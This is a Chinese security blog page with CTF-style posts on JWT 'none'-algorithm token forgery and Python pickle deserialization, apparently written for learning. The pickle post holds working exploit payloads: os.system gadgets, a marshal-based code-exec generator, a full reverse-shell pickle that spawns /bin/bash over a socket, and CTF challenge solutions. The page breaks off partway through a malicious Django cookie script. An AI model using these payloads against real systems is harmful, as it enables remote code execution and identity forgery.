<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>oxcccccc</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="oxcccccc">
<meta property="og:url" content="http:&#x2F;&#x2F;blog.ccreater.top&#x2F;page&#x2F;6&#x2F;index.html">
<meta property="og:site_name" content="oxcccccc">
<meta property="og:locale" content="zh">
<meta property="article:author" content="ccreater">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="oxcccccc" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 4.1.1"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">oxcccccc</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://blog.ccreater.top"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-jwt攻击方式" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2019/12/19/jwt%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/" class="article-date">
  <time class="dt-published" datetime="2019-12-19T07:07:38.103Z" itemprop="datePublished">2019-12-19</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/web/">web</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2019/12/19/jwt%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/">jwt攻击方式</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="jwt"><a href="#jwt" class="headerlink" title="jwt"></a>jwt</h1><h2 id="文章"><a href="#文章" class="headerlink" title="文章"></a>文章</h2><p> <a href="https://xz.aliyun.com/t/6776" target="_blank" rel="noopener">https://xz.aliyun.com/t/6776</a></p>
<p>  <a href="https://www.anquanke.com/post/id/145540" target="_blank" rel="noopener">https://www.anquanke.com/post/id/145540</a> </p>
<h2 id="关于jwt"><a href="#关于jwt" class="headerlink" title="关于jwt"></a>关于jwt</h2><p>JWT的全称是Json Web Token。它遵循JSON格式，将用户信息加密到token里，服务器不保存任何用户信息，只保存密钥信息，通过使用特定加密算法验证token，通过token验证用户身份。基于token的身份验证可以替代传统的cookie+session身份验证方法。</p>
<p>jwt由三个部分组成：<code>header</code>.<code>payload</code>.<code>signature</code></p>
<h3 id="header部分"><a href="#header部分" class="headerlink" title="header部分"></a>header部分</h3><p>header部分最常用的两个字段是<code>alg</code>和<code>typ</code>，<code>alg</code>指定了token加密使用的算法（最常用的为<em>HMAC</em>和<em>RSA</em>算法），typ`声明类型为JWT</p>
<p>header通常会长这个样子：</p>
<pre><code>{
        &quot;alg&quot; : &quot;HS256&quot;,
        &quot;typ&quot; : &quot;jwt&quot;
}</code></pre><h3 id="payload部分"><a href="#payload部分" class="headerlink" title="payload部分"></a>payload部分</h3><p>payload则为用户数据以及一些元数据有关的声明，用以声明权限，举个例子，一次登录的过程可能会传递以下数据</p>
<pre><code>{
        &quot;user_role&quot; : &quot;finn&quot;,    //当前登录用户
    &quot;iss&quot;: &quot;admin&quot;,          //该JWT的签发者
    &quot;iat&quot;: 1573440582,        //签发时间
    &quot;exp&quot;: 1573940267,        //过期时间
    &quot;nbf&quot;: 1573440582,         //该时间之前不接收处理该Token
    &quot;domain&quot;: &quot;example.com&quot;,   //面向的用户
    &quot;jti&quot;: &quot;dff4214121e83057655e10bd9751d657&quot;   //Token唯一标识
}</code></pre><h3 id="signature部分"><a href="#signature部分" class="headerlink" title="signature部分"></a>signature部分</h3><p>signature的功能是保护token完整性。</p>
<p>生成方法为将header和payload两个部分联结起来，然后通过header部分指定的算法，计算出签名。</p>
<p>抽象成公式就是</p>
<pre><code>signature = HMAC-SHA256(base64urlEncode(header) + &#39;.&#39; + base64urlEncode(payload), secret_key)</code></pre><p>值得注意的是，编码header和payload时使用的编码方式为<code>base64urlencode</code>，<code>base64url</code>编码是<code>base64</code>的修改版，为了方便在网络中传输使用了不同的编码表，它不会在末尾填充”=”号，并将标准Base64中的”+”和”/“分别改成了”-“和”-“。</p>
<h3 id="完整token生成"><a href="#完整token生成" class="headerlink" title="完整token生成"></a>完整token生成</h3><p>一个完整的jwt格式为(<code>header</code>.<code>payload</code>.<code>signature</code>)，其中header、payload使用base64url编码，signature通过指定算法生成。</p>
<p>python的<code>Pyjwt</code>使用示例如下</p>
<pre><code>import jwt

encoded_jwt = jwt.encode({&#39;user_name&#39;: &#39;admin&#39;}, &#39;key&#39;, algorithm=&#39;HS256&#39;)
print(encoded_jwt)
print(jwt.decode(encoded_jwt, &#39;key&#39;, algorithms=[&#39;HS256&#39;]))</code></pre><p>生成的token为</p>
<pre><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9`.`eyJ1c2VyX25hbWUiOiJhZG1pbiJ9.oL5szC7mFoJ_7FI9UVMcKfmisqr6Qlo1dusps5wOUlo</code></pre><h2 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h2><h3 id="加密算法"><a href="#加密算法" class="headerlink" title="加密算法"></a>加密算法</h3><h4 id="空加密算法"><a href="#空加密算法" class="headerlink" title="空加密算法"></a>空加密算法</h4><p>JWT支持使用空加密算法，可以在header中指定alg为<code>None</code></p>
<p>这样的话，只要把signature设置为空（即不添加signature字段），提交到服务器，任何token都可以通过服务器的验证。举个例子，使用以下的字段</p>
<pre><code>{
    &quot;alg&quot; : &quot;None&quot;,
    &quot;typ&quot; : &quot;jwt&quot;
}

{
    &quot;user&quot; : &quot;Admin&quot;
}</code></pre><p>生成的完整token为<code>ew0KCSJhbGciIDogIk5vbmUiLA0KCSJ0eXAiIDogImp3dCINCn0.ew0KCSJ1c2VyIiA6ICJBZG1pbiINCn0</code></p>
<p>(header+’.’+payload，去掉了’.’+signature字段)</p>
<p>空加密算法的设计初衷是用于调试的，但是如果某天开发人员脑阔瓦特了，在生产环境中开启了空加密算法，缺少签名算法，jwt保证信息不被篡改的功能就失效了。攻击者只需要把alg字段设置为None，就可以在payload中构造身份信息，伪造用户身份。</p>
<h4 id="修改RSA加密算法为HMAC"><a href="#修改RSA加密算法为HMAC" class="headerlink" title="修改RSA加密算法为HMAC"></a>修改RSA加密算法为HMAC</h4><h3 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h3><p>工具 <a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener">c-jwt-cracker</a> </p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2019/12/19/jwt攻击方式/">http://blog.ccreater.top/2019/12/19/jwt攻击方式/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2019/12/19/jwt%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/" data-id="cka3ckr2z002mv4v09vireu1s" data-title="jwt攻击方式" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-pickle" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2019/12/16/pickle/" class="article-date">
  <time class="dt-published" datetime="2019-12-15T16:41:19.602Z" itemprop="datePublished">2019-12-16</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/web/">web</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2019/12/16/pickle/">python  pickle 入门</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="python-pickle"><a href="#python-pickle" class="headerlink" title="python pickle"></a>python pickle</h1><h2 id="推荐文章"><a href="#推荐文章" class="headerlink" title="推荐文章"></a>推荐文章</h2><p> <a href="https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf" target="_blank" rel="noopener">https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf</a> </p>
<p>z牛: <a href="https://www.anquanke.com/post/id/188981" target="_blank" rel="noopener">https://www.anquanke.com/post/id/188981</a> </p>
<h2 id="pickle操作码大全-v0"><a href="#pickle操作码大全-v0" class="headerlink" title="pickle操作码大全(v0)"></a>pickle操作码大全(v0)</h2><p>有啥不懂的直接看源码把(z牛)</p>
<pre><code class="python">
MARK           = b&#39;(&#39;   # push special markobject on stack
STOP           = b&#39;.&#39;   # every pickle ends with STOP
POP            = b&#39;0&#39;   # discard topmost stack item
POP_MARK       = b&#39;1&#39;   # discard stack top through topmost markobject
DUP            = b&#39;2&#39;   # duplicate top stack item
FLOAT          = b&#39;F&#39;   # push float object; decimal string argument
INT            = b&#39;I&#39;   # push integer or bool; decimal string argument
BININT         = b&#39;J&#39;   # push four-byte signed int
BININT1        = b&#39;K&#39;   # push 1-byte unsigned int
LONG           = b&#39;L&#39;   # push long; decimal string argument
BININT2        = b&#39;M&#39;   # push 2-byte unsigned int
NONE           = b&#39;N&#39;   # push None
PERSID         = b&#39;P&#39;   # push persistent object; id is taken from string arg
BINPERSID      = b&#39;Q&#39;   #  &quot;       &quot;         &quot;  ;  &quot;  &quot;   &quot;     &quot;  stack
REDUCE         = b&#39;R&#39;   # apply callable to argtuple, both on stack
STRING         = b&#39;S&#39;   # push string; NL-terminated string argument
BINSTRING      = b&#39;T&#39;   # push string; counted binary string argument
SHORT_BINSTRING= b&#39;U&#39;   #  &quot;     &quot;   ;    &quot;      &quot;       &quot;      &quot; &lt; 256 bytes
UNICODE        = b&#39;V&#39;   # push Unicode string; raw-unicode-escaped&#39;d argument
BINUNICODE     = b&#39;X&#39;   #   &quot;     &quot;       &quot;  ; counted UTF-8 string argument
APPEND         = b&#39;a&#39;   # append stack top to list below it
BUILD          = b&#39;b&#39;   # call __setstate__ or __dict__.update()
GLOBAL         = b&#39;c&#39;   # push self.find_class(modname, name); 2 string args
DICT           = b&#39;d&#39;   # build a dict from stack items
EMPTY_DICT     = b&#39;}&#39;   # push empty dict
APPENDS        = b&#39;e&#39;   # extend list on stack by topmost stack slice
GET            = b&#39;g&#39;   # push item from memo on stack; index is string arg
BINGET         = b&#39;h&#39;   #   &quot;    &quot;    &quot;    &quot;   &quot;   &quot;  ;   &quot;    &quot; 1-byte arg
INST           = b&#39;i&#39;   # build &amp; push class instance
LONG_BINGET    = b&#39;j&#39;   # push item from memo on stack; index is 4-byte arg
LIST           = b&#39;l&#39;   # build list from topmost stack items
EMPTY_LIST     = b&#39;]&#39;   # push empty list
OBJ            = b&#39;o&#39;   # build &amp; push class instance
PUT            = b&#39;p&#39;   # store stack top in memo; index is string arg
BINPUT         = b&#39;q&#39;   #   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 1-byte arg
LONG_BINPUT    = b&#39;r&#39;   #   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 4-byte arg
SETITEM        = b&#39;s&#39;   # add key+value pair to dict
TUPLE          = b&#39;t&#39;   # build tuple from topmost stack items
EMPTY_TUPLE    = b&#39;)&#39;   # push empty tuple
SETITEMS       = b&#39;u&#39;   # modify dict by adding topmost key+value pairs
BINFLOAT       = b&#39;G&#39;   # push float; arg is 8-byte float encoding

TRUE           = b&#39;I01\n&#39;  # not an opcode; see INT docs in pickletools.py
FALSE          = b&#39;I00\n&#39;  # not an opcode; see INT docs in pickletools.py
</code></pre>
<h2 id="pickle介绍"><a href="#pickle介绍" class="headerlink" title="pickle介绍"></a>pickle介绍</h2><h3 id="pickle的大致过程"><a href="#pickle的大致过程" class="headerlink" title="pickle的大致过程"></a>pickle的大致过程</h3><p>以Foo类为例</p>
<ol>
<li>提取出Foo类中的所有attribute(从<code>__dict__</code>中获得)将其转化为键值对</li>
<li>写入对象类名</li>
<li>写入第一步生成的键值对</li>
</ol>
<h3 id="unpickle的大致过程"><a href="#unpickle的大致过程" class="headerlink" title="unpickle的大致过程"></a>unpickle的大致过程</h3><ol>
<li>获取pickle流</li>
<li>重新构建属性列表</li>
<li>根据保存的类名来创建对象</li>
<li>将属性列表恢复到对象中</li>
</ol>
<h3 id="pvm组成-解析pickle"><a href="#pvm组成-解析pickle" class="headerlink" title="pvm组成(解析pickle)"></a>pvm组成(解析pickle)</h3><ol>
<li>指令解释器<br>最后一步一定是返回栈顶元素</li>
<li>栈 </li>
<li>memo(临时保存数据)<br>用类似list的方式来读取和储存数据,以字典方式实现<br>如p100,意为把栈顶元素保存到memo中索引为100</li>
</ol>
<h3 id="pvm指令格式"><a href="#pvm指令格式" class="headerlink" title="pvm指令格式"></a>pvm指令格式</h3><ol>
<li><p>pvm的操作码只有一个字节</p>
</li>
<li><p>需要参数的操作码,要在每一个参数后面加上换行符</p>
</li>
<li><p>从pickle流中读取数据,并加载到栈上</p>
</li>
</ol>
<h2 id="如何生成pickle"><a href="#如何生成pickle" class="headerlink" title="如何生成pickle"></a>如何生成pickle</h2><h3 id="操作码"><a href="#操作码" class="headerlink" title="操作码"></a>操作码</h3><h4 id="加载数据"><a href="#加载数据" class="headerlink" title="加载数据"></a>加载数据</h4><table>
<thead>
<tr>
<th>操作码</th>
<th>助记</th>
<th>加载到栈上的数据类型</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td>S</td>
<td>string</td>
<td>String</td>
<td>S’foo’\n</td>
</tr>
<tr>
<td>V</td>
<td>unicode</td>
<td>unicode</td>
<td>Vfo\u006f\n</td>
</tr>
<tr>
<td>I</td>
<td>int</td>
<td>int</td>
<td>I42\n</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h4 id="修改栈-memo"><a href="#修改栈-memo" class="headerlink" title="修改栈/memo"></a>修改栈/memo</h4><table>
<thead>
<tr>
<th>操作码</th>
<th>助记</th>
<th>描述</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td>(</td>
<td>MARK</td>
<td>向栈中加入一个标记</td>
<td>(</td>
</tr>
<tr>
<td>0</td>
<td>POP</td>
<td>弹出栈顶元素并丢弃</td>
<td>0</td>
</tr>
<tr>
<td>p<code>&lt;memo_index&gt;</code>\n</td>
<td>PUT</td>
<td>复制栈顶元素到memo中</td>
<td>p101\n</td>
</tr>
<tr>
<td>g<code>&lt;memo_index&gt;</code>\n</td>
<td>GET</td>
<td>将memo中指定元素拷贝到栈顶</td>
<td>g101\n</td>
</tr>
</tbody></table>
<h4 id="生成-修改列表-字典-元组"><a href="#生成-修改列表-字典-元组" class="headerlink" title="生成/修改列表,字典,元组"></a>生成/修改列表,字典,元组</h4><table>
<thead>
<tr>
<th>操作码</th>
<th>助记</th>
<th>描述</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td>l</td>
<td>列表</td>
<td>将栈顶到遇到的第一个mask之间的元素到一个列表,并将这个列表放入栈中</td>
<td>(S’string’\nl</td>
</tr>
<tr>
<td>t</td>
<td>元组</td>
<td>将栈顶到遇到的第一个mask之间的元素放到一个元组中,并将这个元组放入栈中</td>
<td>(S’string’\nS’string2’\nt</td>
</tr>
<tr>
<td>d</td>
<td>字典</td>
<td>将栈顶到遇到的第一个mask之间的元素放到一个字典中,并将这个字典放入栈中</td>
<td>(S’key1’\nS’value1’\nS’key2’\nS’value2’\nd</td>
</tr>
<tr>
<td>s</td>
<td>SETITEM</td>
<td>从栈出弹出三个值:字典,键,值,将键值对合并到字典中</td>
<td>(S’key1’\nS’val1’\nS’key2’\nI123\ndS’key3’\nS’val 3’\ns</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h4 id="pickle-流生成元组的过程"><a href="#pickle-流生成元组的过程" class="headerlink" title="pickle 流生成元组的过程"></a>pickle 流生成元组的过程</h4><ul>
<li><p>生成元组的指令</p>
<pre><code>(S&#39;str1&#39;
S&#39;str2&#39;
I1234
t</code></pre></li>
<li><p>生成元组的过程图</p>
</li>
</ul>
<p><img src="https://ws1.sinaimg.cn/large/006pWR9agy1g9vcyoggx7j310z0fs74s.jpg" alt="image5192"></p>
<h4 id="加载对象"><a href="#加载对象" class="headerlink" title="加载对象"></a>加载对象</h4><table>
<thead>
<tr>
<th>操作码</th>
<th>助记</th>
<th>描述</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td>c</td>
<td>GLOBAL</td>
<td>需要两个参数(module,class)来创建对象,并将其放到栈中</td>
<td>cos\nsystem\n</td>
</tr>
<tr>
<td>R</td>
<td>REDUCE</td>
<td>弹出一个参数元组和一个可调用对象（可能是由GLOBAL加载的），将参数应用于可调用对象并将结果压入栈中</td>
<td>cos\nsystem\n(S’sleep 10’\ntR</td>
</tr>
</tbody></table>
<h4 id="加载对象过程图"><a href="#加载对象过程图" class="headerlink" title="加载对象过程图"></a>加载对象过程图</h4><p><img src="https://ws1.sinaimg.cn/large/006pWR9agy1g9vebew5nvj312p0j8jto.jpg" alt="image5725"></p>
<p><img src="https://ws1.sinaimg.cn/large/006pWR9agy1g9vebmas4ij31350k30v4.jpg" alt="image5808"></p>
<p><img src="https://ws1.sinaimg.cn/large/006pWR9agy1g9vebufeq6j313g0mfq6a.jpg" alt="image5889"></p>
<p><img src="https://ws1.sinaimg.cn/large/006pWR9agy1g9vec1wavgj312r0i3tb6.jpg" alt="image5970"></p>
<p><img src="https://ws1.sinaimg.cn/large/006pWR9agy1g9vec9lsjpj31350iggo8.jpg" alt="image6051"></p>
<p><img src="https://ws1.sinaimg.cn/large/006pWR9aly1g9ved0gxklj31490l7q6n.jpg" alt="image6132"></p>
<h2 id="编写pickle的一些技巧"><a href="#编写pickle的一些技巧" class="headerlink" title="编写pickle的一些技巧"></a>编写pickle的一些技巧</h2><p>我们如何执行如下的代码:</p>
<pre><code class="python">f=open(&#39;/path/to/massive/sikrit&#39;) 
f.read()</code></pre>
<p>思路是:首先执行open函数,将其储存在memo里面,在利用魔术方法来执行f.read()</p>
<p><code>f.read()</code>可以等价替换成<code>__builtin__.apply( __builtin__.getattr(file,&#39;read&#39;), [f])</code></p>
<p>最后合成的pickle是</p>
<pre><code>#step1
c__builtin__
open
(S&#39;/path/to/massive/sikrit&#39;
tRp100
#step2
c__builtin__
apply
(c__builtin__
getattr
(c__builtin__
file
S&#39;read&#39;
tR(g100
ltR.</code></pre><h3 id="手写pickle模板"><a href="#手写pickle模板" class="headerlink" title="手写pickle模板"></a>手写pickle模板</h3><p><img src="https://ws1.sinaimg.cn/large/006pWR9agy1g9xumsbi3oj30qg0hoad6.jpg" alt="image6628"></p>
<h3 id="利用-reduce-来生成pickle代码"><a href="#利用-reduce-来生成pickle代码" class="headerlink" title="利用__reduce__来生成pickle代码"></a>利用<code>__reduce__</code>来生成pickle代码</h3><p><code>__reduce__</code></p>
<blockquote>
<p>当定义扩展类型时（也就是使用Python的C语言API实现的类型），如果你想pickle它们，你必须告诉Python如何pickle它们。 <strong>reduce</strong> 被定义之后，当对象被Pickle时就会被调用。 </p>
</blockquote>
<pre><code class="python">import os, pickle
class Test(object):
    def __reduce__(self):
        return (os.system,(&#39;ls&#39;,))

print(pickle.dumps(Test(), protocol=0))</code></pre>
<h3 id="利用marshal和cPickle来生成代码"><a href="#利用marshal和cPickle来生成代码" class="headerlink" title="利用marshal和cPickle来生成代码"></a>利用marshal和cPickle来生成代码</h3><pre><code class="python"># !/usr/bin/env python
# -*- coding:utf-8 -*-
__author__ = &#39;bit4&#39;
__github__ = &#39;https://github.com/bit4woo&#39;

import marshal
import base64
import cPickle
import urllib
import pickle

def foo():#you should write your code in this function
    import os
    def fib(n):
        if n &lt;= 1:
            return n
        return fib(n-1) + fib(n-2)
    print &#39;fib(10) =&#39;, fib(10)
    os.system(&#39;dir&#39;)

code_serialized = base64.b64encode(marshal.dumps(foo.func_code))


#为了保证code_serialized中的内容得到执行，我们需要如下代码
#(types.FunctionType(marshal.loads(base64.b64decode(code_serialized)), globals(), &#39;&#39;))()

payload =  &quot;&quot;&quot;ctypes
FunctionType
(cmarshal
loads
(cbase64
b64decode
(S&#39;%s&#39;
tRtRc__builtin__
globals
(tRS&#39;&#39;
tR(tR.&quot;&quot;&quot; % base64.b64encode(marshal.dumps(foo.func_code))
print(payload)</code></pre>
<h2 id="经验"><a href="#经验" class="headerlink" title="经验"></a>经验</h2><h3 id="通过源码查看pickle的方法"><a href="#通过源码查看pickle的方法" class="headerlink" title="通过源码查看pickle的方法"></a>通过源码查看pickle的方法</h3><p>直接所有操作码对应的变量</p>
<p><img src="https://i.loli.net/2019/12/23/pWlFyYPKB7enMQE.png" alt="image7895"></p>
<p><code>dispatch[BININT1[0]] = load_binint1</code></p>
<p>找到类似这种的后面的就是对应的函数</p>
<h2 id="pickle工具"><a href="#pickle工具" class="headerlink" title="pickle工具"></a>pickle工具</h2><p> <a href="https://github.com/sensepost/anapickle" target="_blank" rel="noopener">converttopickle.py</a></p>
<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p> <a href="https://github.com/sensepost/anapickle/blob/master/anapickle.py" target="_blank" rel="noopener">https://github.com/sensepost/anapickle/blob/master/anapickle.py</a> </p>
<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><pre><code class="python">&#39;&#39;&#39;csocket\n__dict__\np101\n0c__builtin__\ngetattr\n(g101\nS&#39;__getitem__&#39;\ntRp102\n0g102\n(S&#39;AF_INET&#39;\ntRp100\n0csocket\n__dict__\np104\n0c__builtin__\ngetattr\n(g104\nS&#39;__getitem__&#39;\ntRp105\n0g105\n(S&#39;SOCK_STREAM&#39;\ntRp103\n0csocket\n__dict__\np107\n0c__builtin__\ngetattr\n(g107\nS&#39;__getitem__&#39;\ntRp108\n0g108\n(S&#39;IPPROTO_TCP&#39;\ntRp106\n0csocket\n__dict__\np110\n0c__builtin__\ngetattr\n(g110\nS&#39;__getitem__&#39;\ntRp111\n0g111\n(S&#39;SOL_SOCKET&#39;\ntRp109\n0csocket\n__dict__\np113\n0c__builtin__\ngetattr\n(g113\nS&#39;__getitem__&#39;\ntRp114\n0g114\n(S&#39;SO_REUSEADDR&#39;\ntRp112\n0csocket\nsocket\n(g100\ng103\ng106\ntRp115\n0c__builtin__\ngetattr\n(csocket\nsocket\nS&#39;setsockopt&#39;\ntRp116\n0c__builtin__\napply\n(g116\n(g115\ng109\ng112\nI1\nltRp117\n0c__builtin__\ngetattr\n(csocket\nsocket\nS&#39;connect&#39;\ntRp118\n0c__builtin__\napply\n(g118\n(g115\n(S&#39;localhost&#39;\nI55555\ntltRp119\n0c__builtin__\ngetattr\n(csocket\n_socketobject\nS&#39;fileno&#39;\ntRp120\n0c__builtin__\napply\n(g120\n(g115\nltRp121\n0c__builtin__\nint\n(g121\ntRp122\n0csubprocess\nPopen\n((S&#39;/bin/bash&#39;\ntI0\nS&#39;/bin/bash&#39;\ng122\ng122\ng122\ntRp123\n0S&#39;finished&#39;\n.&#39;&#39;&#39;</code></pre>
<p>localhost:55555</p>
<h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><ol>
<li>使用v0版的pickle协议,保证shellcode的通用性</li>
</ol>
<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="suctf-guess-game"><a href="#suctf-guess-game" class="headerlink" title="suctf guess_game"></a>suctf guess_game</h3><p><a href="https://github.com/team-su/SUCTF-2019/tree/master/Misc/guess_game" target="_blank" rel="noopener">题目链接</a></p>
<p>考点:pickle</p>
<p>代码审计一波后</p>
<p>如果猜对10次后会给flag(机会只有10次)</p>
<p>因为知道是考pickle直接全局搜索pickle发现在server处有</p>
<p><code>ticket = restricted_loads(ticket)</code></p>
<p>其中ticket是我们可控点</p>
<p>跟进去看</p>
<pre><code class="python">class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        # Only allow safe classes
        if &quot;guess_game&quot; == module[0:10] and &quot;__&quot; not in name:
            return getattr(sys.modules[module], name)
        # Forbid everything else.
        raise pickle.UnpicklingError(&quot;global &#39;%s.%s&#39; is forbidden&quot; % (module, name))


def restricted_loads(s):
    &quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;
    return RestrictedUnpickler(io.BytesIO(s)).load()</code></pre>
<p>我们只能加载guess_game中的类,并且不能调用魔术方法.</p>
<p>在这一题中拿到flag有两种方式:</p>
<ol>
<li>命令执行</li>
<li>通过游戏</li>
</ol>
<p>在怼着find_class许久之后发现没办法绕过,于是只能走通过游戏这一条路了</p>
<p>而游戏中判定赢的条件是</p>
<pre><code class="python">class Game
    def is_win(self):
        return self.win_count == max_round</code></pre>
<p>如果我们能直接修改win_count或者max_round就可以拿到flag了</p>
<p>我们发现在<code>guess_game</code>中已经有一个<code>game = Game()</code>这个了,也就是我们可以利用pickle来加载这个game直接修改</p>
<p>那么接下来就是如何修改了</p>
<p>在pickle的操作码中我们发现</p>
<p><code>BUILD          = b&#39;b&#39;   # call __setstate__ or __dict__.update()</code>这一条</p>
<p>其中update()就可以修改game的属性了</p>
<p>那么接下来就只有一个问题了,操作码<code>b</code>如何使用</p>
<p>一路跟踪发现b操作码的实现</p>
<pre><code class="python">    def load_build(self):
        stack = self.stack
        state = stack.pop()
        inst = stack[-1]
        setstate = getattr(inst, &quot;__setstate__&quot;, None)
        if setstate is not None:
            setstate(state)
            return
        slotstate = None
        if isinstance(state, tuple) and len(state) == 2:
            state, slotstate = state
        if state:
            inst_dict = inst.__dict__
            intern = sys.intern
            for k, v in state.items():
                if type(k) is str:
                    inst_dict[intern(k)] = v
                else:
                    inst_dict[k] = v
        if slotstate:
            for k, v in slotstate.items():
                setattr(inst, k, v)</code></pre>
<p>没有调用参数,栈顶应为字典,栈顶的下面是要修改的对象</p>
<p>最后的payload:</p>
<pre><code class="python">b&quot;cguess_game\ngame\n(S&#39;win_count&#39;\nI10\nS&#39;round_count&#39;\nI10\ndb\x80\x03cguess_game.Ticket\nTicket\nq\x00)\x81q\x01}q\x02X\x06\x00\x00\x00numberq\x03K\x01sb.&quot;</code></pre>
<h3 id="code-breaking-picklecode"><a href="#code-breaking-picklecode" class="headerlink" title="code breaking picklecode"></a>code breaking picklecode</h3><p><a href="https://github.com/phith0n/code-breaking/blob/master/2018/picklecode" target="_blank" rel="noopener">题目链接</a></p>
<p>代码审计发现在index处可以ssti</p>
<pre><code class="python">def index(request):
    django_engine = engines[&#39;django&#39;]
    template = django_engine.from_string(&#39;My name is &#39; + request.user.username)

    return HttpResponse(template.render(None, request))</code></pre>
<p>但是django难以利用ssti命令执行但是能读取敏感配置</p>
<p>结合serializer.py</p>
<pre><code class="python">class RestrictedUnpickler(pickle.Unpickler):
    blacklist = {&#39;eval&#39;, &#39;exec&#39;, &#39;execfile&#39;, &#39;compile&#39;, &#39;open&#39;, &#39;input&#39;, &#39;__import__&#39;, &#39;exit&#39;}

    def find_class(self, module, name):
        # Only allow safe classes from builtins.
        if module == &quot;builtins&quot; and name not in self.blacklist:
            return getattr(builtins, name)
        # Forbid everything else.
        raise pickle.UnpicklingError(&quot;global &#39;%s.%s&#39; is forbidden&quot; %
                                     (module, name))


class PickleSerializer():
    def dumps(self, obj):
        return pickle.dumps(obj)

    def loads(self, data):
        try:
            if isinstance(data, str):
                raise TypeError(&quot;Can&#39;t load pickle from unicode string&quot;)
            file = io.BytesIO(data)
            return RestrictedUnpickler(file,
                              encoding=&#39;ASCII&#39;, errors=&#39;strict&#39;).load()
        except Exception as e:
            return {}</code></pre>
<p>和setting文件里的特殊配置</p>
<pre><code class="python">SESSION_ENGINE = &#39;django.contrib.sessions.backends.signed_cookies&#39;
SESSION_SERIALIZER = &#39;core.serializer.PickleSerializer&#39;</code></pre>
<p>查阅django文档发现</p>
<p> <a href="https://docs.djangoproject.com/zh-hans/3.0/topics/http/sessions/#using-cookie-based-sessions" target="_blank" rel="noopener">https://docs.djangoproject.com/zh-hans/3.0/topics/http/sessions/#using-cookie-based-sessions</a> </p>
<p>可以确定,这里是通过读取secret_key来构造恶意cookie来pickle反序列化命令执行</p>
<p>我们跟进django.contrib.sessions.backends.signed_cookies来了解如何生成储存session的cookie(这里花了我很久的时间,从尝试看一步一步调试到看调用堆栈再到查文档最后才搞清楚过程,建议自己尝试)</p>
<p>在理解之后便有一下生成恶意cookie的代码</p>
<pre><code class="python">import base64
